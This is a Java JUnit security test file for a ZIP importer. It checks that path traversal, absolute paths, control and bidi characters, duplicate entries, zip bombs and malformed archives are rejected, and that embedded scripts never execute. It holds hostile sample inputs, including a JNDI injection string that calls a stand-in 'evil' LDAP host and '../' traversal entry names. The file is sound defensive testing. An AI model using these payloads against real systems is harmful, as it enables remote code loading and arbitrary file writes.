package br.com.instadino.importacao;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import br.com.instadino.fixtures.ConstrutorDeExportacao;
import br.com.instadino.fixtures.ZipsMaliciosos;
import br.com.instadino.importacao.ImportacaoRejeitadaException.Motivo;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.List;
import java.util.stream.Stream;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/** Requisitos IMP-01 a IMP-09: o ZIP é uma entrada hostil. */
class SegurancaDoImportadorTest {

    @TempDir
    Path pasta;

    private Path gravar(byte[] bytes) throws IOException {
        Path zip = pasta.resolve("entrada.zip");
        Files.write(zip, bytes);
        return zip;
    }

    private void esperarRejeicao(byte[] bytes, LimitesDeImportacao limites, Motivo esperado) throws IOException {
        Path zip = gravar(bytes);
        var importador = new ImportadorDeExportacao(limites);
        assertThatThrownBy(() -> importador.inspecionar(zip, new Cancelamento(), OuvinteDeProgresso.NENHUM))
                .isInstanceOfSatisfying(ImportacaoRejeitadaException.class, e -> assertThat(e.motivo()).isEqualTo(esperado));
        assertThatThrownBy(() -> importador.importar(zip, ConfiguracaoDeImportacao.padrao(), new Cancelamento(), OuvinteDeProgresso.NENHUM))
                .isInstanceOfSatisfying(ImportacaoRejeitadaException.class, e -> assertThat(e.motivo()).isEqualTo(esperado));
        nadaFoiCriadoAlemDoZip();
    }

    private void nadaFoiCriadoAlemDoZip() throws IOException {
        try (Stream<Path> arquivos = Files.list(pasta)) {
            assertThat(arquivos.map(p -> p.getFileName().toString())).containsExactly("entrada.zip");
        }
        assertThat(Path.of("/tmp/instadino-absoluto.json")).doesNotExist();
        assertThat(pasta.getParent().resolve("etc/instadino-fora.json")).doesNotExist();
    }

    // ---- IMP-01 / IMP-02: caminhos perigosos ----

    @Test
    void rejeitaPathTraversalComPontosPontos() throws IOException {
        esperarRejeicao(ZipsMaliciosos.caminhoComPontosPontos(), LimitesDeImportacao.padrao(), Motivo.CAMINHO_PERIGOSO);
    }

    @Test
    void rejeitaCaminhoAbsolutoUnix() throws IOException {
        esperarRejeicao(ZipsMaliciosos.caminhoAbsolutoUnix(), LimitesDeImportacao.padrao(), Motivo.CAMINHO_PERIGOSO);
    }

    @Test
    void rejeitaCaminhoAbsolutoWindowsComUnidade() throws IOException {
        esperarRejeicao(ZipsMaliciosos.caminhoAbsolutoWindows(), LimitesDeImportacao.padrao(), Motivo.CAMINHO_PERIGOSO);
    }

    @Test
    void rejeitaBarraInvertidaESeparadoresMistos() throws IOException {
        esperarRejeicao(ZipsMaliciosos.caminhoComBarraInvertida(), LimitesDeImportacao.padrao(), Motivo.CAMINHO_PERIGOSO);
    }

    @Test
    void rejeitaByteNuloECaracteresDeControle() throws IOException {
        esperarRejeicao(ZipsMaliciosos.caminhoComByteNulo(), LimitesDeImportacao.padrao(), Motivo.CAMINHO_PERIGOSO);
        esperarRejeicao(ZipsMaliciosos.comEntrada("a/\n/b.json", new byte[0]), LimitesDeImportacao.padrao(), Motivo.CAMINHO_PERIGOSO);
    }

    @Test
    void rejeitaCaracteresDeFormatacaoBidirecionalQueFalsificamONome() throws IOException {
        esperarRejeicao(ZipsMaliciosos.comEntrada("connections/‮gnp.json", new byte[0]), LimitesDeImportacao.padrao(), Motivo.CAMINHO_PERIGOSO);
    }

    @Test
    void rejeitaTraversalEscondidoNoMeioDoCaminho() throws IOException {
        esperarRejeicao(ZipsMaliciosos.comEntrada("connections/followers_and_following/../../../fora.json", new byte[0]),
                LimitesDeImportacao.padrao(), Motivo.CAMINHO_PERIGOSO);
    }

    @Test
    void rejeitaSegmentosVaziosENomesGigantes() throws IOException {
        esperarRejeicao(ZipsMaliciosos.comEntrada("a//b.json", new byte[0]), LimitesDeImportacao.padrao(), Motivo.CAMINHO_PERIGOSO);
        esperarRejeicao(ZipsMaliciosos.comEntrada("a".repeat(600) + ".json", new byte[0]), LimitesDeImportacao.padrao(), Motivo.CAMINHO_PERIGOSO);
    }

    @Test
    void rejeitaDiretoriosProfundosDemais() throws IOException {
        esperarRejeicao(ZipsMaliciosos.caminhoMuitoProfundo(40), LimitesDeImportacao.padrao(), Motivo.CAMINHO_PERIGOSO);
    }

    // ---- IMP-04: duplicatas ----

    @Test
    void rejeitaEntradasComNomeIdentico() throws IOException {
        esperarRejeicao(ZipsMaliciosos.duplicadasExatas(), LimitesDeImportacao.padrao(), Motivo.ENTRADA_DUPLICADA);
    }

    @Test
    void rejeitaEntradasQueSoDiferemEmCaixa() throws IOException {
        esperarRejeicao(ZipsMaliciosos.duplicadasPorCaixa(), LimitesDeImportacao.padrao(), Motivo.ENTRADA_DUPLICADA);
    }

    @Test
    void rejeitaEntradasQueSoDiferemEmNormalizacaoUnicode() throws IOException {
        String nfc = "connections/café.json";
        String nfd = "connections/café.json";
        byte[] zip = ZipsMaliciosos.comEntrada(nfc, new byte[0]);
        // monta um segundo ZIP com as duas formas
        try (var saida = new java.io.ByteArrayOutputStream(); var z = new java.util.zip.ZipOutputStream(saida)) {
            z.putNextEntry(new java.util.zip.ZipEntry(nfc));
            z.closeEntry();
            z.putNextEntry(new java.util.zip.ZipEntry(nfd));
            z.closeEntry();
            z.finish();
            zip = saida.toByteArray();
        }
        esperarRejeicao(zip, LimitesDeImportacao.padrao(), Motivo.ENTRADA_DUPLICADA);
    }

    // ---- IMP-03: limites e ZIP bombs ----

    @Test
    void rejeitaZipBombPelaRazaoDeCompressao() throws IOException {
        esperarRejeicao(ZipsMaliciosos.bombaDeCompressao(64), LimitesDeImportacao.padrao(), Motivo.COMPRESSAO_SUSPEITA);
    }

    @Test
    void contemZipBombQueEscapariaDaRazaoPeloLimiteRealDeBytesLidos() throws IOException {
        var limites = LimitesDeImportacao.padrao()
                .comRazaoDeCompressao(Long.MAX_VALUE / 2, 1L << 40)
                .comTamanhoMaximoPorEntradaLida(8L * 1024 * 1024);
        Path zip = gravar(ZipsMaliciosos.bombaDeCompressao(64));
        var importador = new ImportadorDeExportacao(limites);
        assertThatThrownBy(() -> importador.importar(zip, ConfiguracaoDeImportacao.padrao(), new Cancelamento(), OuvinteDeProgresso.NENHUM))
                .isInstanceOfSatisfying(ImportacaoRejeitadaException.class, e -> assertThat(e.motivo()).isEqualTo(Motivo.COMPRESSAO_SUSPEITA));
        nadaFoiCriadoAlemDoZip();
    }

    @Test
    void rejeitaQuantidadeExcessivaDeEntradas() throws IOException {
        esperarRejeicao(ZipsMaliciosos.muitasEntradas(500), LimitesDeImportacao.padrao().comEntradasMaximas(100), Motivo.ENTRADAS_DEMAIS);
    }

    @Test
    void rejeitaZipMaiorQueOLimite() throws IOException {
        esperarRejeicao(ConstrutorDeExportacao.exemplo().bytes(), LimitesDeImportacao.padrao().comTamanhoMaximoDoZip(100), Motivo.ZIP_GRANDE_DEMAIS);
    }

    @Test
    void rejeitaSomaDeclaradaExcessiva() throws IOException {
        esperarRejeicao(ConstrutorDeExportacao.exemplo().bytes(), LimitesDeImportacao.padrao().comTamanhoDeclaradoTotalMaximo(10), Motivo.TAMANHO_DECLARADO_EXCESSIVO);
    }

    // ---- Arquivos malformados ----

    @Test
    void rejeitaArquivoQueNaoEZip() throws IOException {
        esperarRejeicao(ZipsMaliciosos.naoEhZip(), LimitesDeImportacao.padrao(), Motivo.NAO_E_ZIP);
    }

    @Test
    void rejeitaZipTruncado() throws IOException {
        esperarRejeicao(ZipsMaliciosos.truncado(ConstrutorDeExportacao.exemplo().bytes()), LimitesDeImportacao.padrao(), Motivo.NAO_E_ZIP);
    }

    @Test
    void rejeitaArquivoVazio() throws IOException {
        esperarRejeicao(ZipsMaliciosos.vazio(), LimitesDeImportacao.padrao(), Motivo.ZIP_VAZIO);
    }

    @Test
    void rejeitaArquivoInexistenteEDiretorio() {
        var importador = new ImportadorDeExportacao(LimitesDeImportacao.padrao());
        for (Path alvo : List.of(pasta.resolve("nao-existe.zip"), pasta)) {
            assertThatThrownBy(() -> importador.inspecionar(alvo, new Cancelamento(), OuvinteDeProgresso.NENHUM))
                    .isInstanceOfSatisfying(ImportacaoRejeitadaException.class, e -> assertThat(e.motivo()).isEqualTo(Motivo.ARQUIVO_INEXISTENTE));
        }
    }

    @Test
    void rejeitaZipSemNenhumDadoReconhecido() throws IOException {
        var c = new ConstrutorDeExportacao().arquivo("qualquer/coisa.txt", "x").arquivo("outro.bin", new byte[] {1});
        esperarRejeicao(c.bytes(), LimitesDeImportacao.padrao(), Motivo.SEM_DADOS_RECONHECIDOS);
    }

    @Test
    void umZipValidoPassaEmTodasAsVerificacoes() throws IOException {
        Path zip = gravar(ConstrutorDeExportacao.exemplo().comCategoriasDiversas().bytes());
        var r = new ImportadorDeExportacao(LimitesDeImportacao.padrao())
                .importar(zip, ConfiguracaoDeImportacao.padrao(), new Cancelamento(), OuvinteDeProgresso.NENHUM);
        assertThat(r.registrosValidos()).isEqualTo(8);
    }

    @Test
    void mensagensDeErroNaoExpoeCaminhosDoSistema() throws IOException {
        Path zip = gravar(ZipsMaliciosos.caminhoComPontosPontos());
        var importador = new ImportadorDeExportacao(LimitesDeImportacao.padrao());
        assertThatThrownBy(() -> importador.inspecionar(zip, new Cancelamento(), OuvinteDeProgresso.NENHUM))
                .hasMessageNotContaining(pasta.toString()).hasMessageNotContaining("etc/instadino");
    }

    // ---- IMP-06 / IMP-07: cancelamento e tempo ----

    @Test
    void cancelamentoAntesDeComecarInterrompeSemEfeitos() throws IOException {
        Path zip = gravar(ConstrutorDeExportacao.exemplo().bytes());
        var cancelamento = new Cancelamento();
        cancelamento.cancelar();
        var importador = new ImportadorDeExportacao(LimitesDeImportacao.padrao());
        assertThatThrownBy(() -> importador.importar(zip, ConfiguracaoDeImportacao.padrao(), cancelamento, OuvinteDeProgresso.NENHUM))
                .isInstanceOfSatisfying(ImportacaoRejeitadaException.class, e -> assertThat(e.motivo()).isEqualTo(Motivo.CANCELADA));
        nadaFoiCriadoAlemDoZip();
    }

    @Test
    void cancelamentoDuranteALeituraInterrompe() throws IOException {
        Path zip = gravar(ConstrutorDeExportacao.exemplo().bytes());
        var cancelamento = new Cancelamento();
        var importador = new ImportadorDeExportacao(LimitesDeImportacao.padrao());
        OuvinteDeProgresso cancelaNoPrimeiroArquivo = (etapa, atual, total) -> {
            if (etapa.startsWith("Lendo")) {
                cancelamento.cancelar();
            }
        };
        assertThatThrownBy(() -> importador.importar(zip, ConfiguracaoDeImportacao.padrao(), cancelamento, cancelaNoPrimeiroArquivo))
                .isInstanceOfSatisfying(ImportacaoRejeitadaException.class, e -> assertThat(e.motivo()).isEqualTo(Motivo.CANCELADA));
    }

    /** Repetido: o resultado não pode depender da granularidade do relógio (falhou de forma intermitente no Windows). */
    @org.junit.jupiter.api.RepeatedTest(100)
    void tempoMaximoEsgotadoInterrompe() throws IOException {
        Path zip = gravar(ConstrutorDeExportacao.exemplo().bytes());
        var importador = new ImportadorDeExportacao(LimitesDeImportacao.padrao().comTempoMaximo(Duration.ofNanos(1)));
        assertThatThrownBy(() -> importador.importar(zip, ConfiguracaoDeImportacao.padrao(), new Cancelamento(), OuvinteDeProgresso.NENHUM))
                .isInstanceOfSatisfying(ImportacaoRejeitadaException.class, e -> assertThat(e.motivo()).isEqualTo(Motivo.TEMPO_ESGOTADO));
    }

    // ---- IMP-05: nada é executado ----

    @Test
    void conteudoComSintaxeDeCodigoEApenasTexto() throws IOException {
        var c = new ConstrutorDeExportacao().seguindo("ana");
        c.arquivo("connections/followers_and_following/followers_1.json",
                "[{\"string_list_data\":[{\"value\":\"${jndi:ldap://evil/x}\"}]},{\"string_list_data\":[{\"value\":\"ana\"}]}]");
        c.arquivo("scripts/run.sh", "#!/bin/sh\ntouch " + pasta.resolve("executado").toString().replace(" ", "\\ ") + "\n");
        c.arquivo("scripts/run.exe", "MZ".getBytes(StandardCharsets.ISO_8859_1));
        Path zip = gravar(c.bytes());
        var r = new ImportadorDeExportacao(LimitesDeImportacao.padrao())
                .importar(zip, ConfiguracaoDeImportacao.padrao(), new Cancelamento(), OuvinteDeProgresso.NENHUM);
        assertThat(r.registrosInvalidos()).isEqualTo(1);
        assertThat(pasta.resolve("executado")).doesNotExist();
        assertThat(r.inventario().arquivosPorCategoria().get(CategoriaDeDados.DESCONHECIDA)).isEqualTo(2);
    }
}
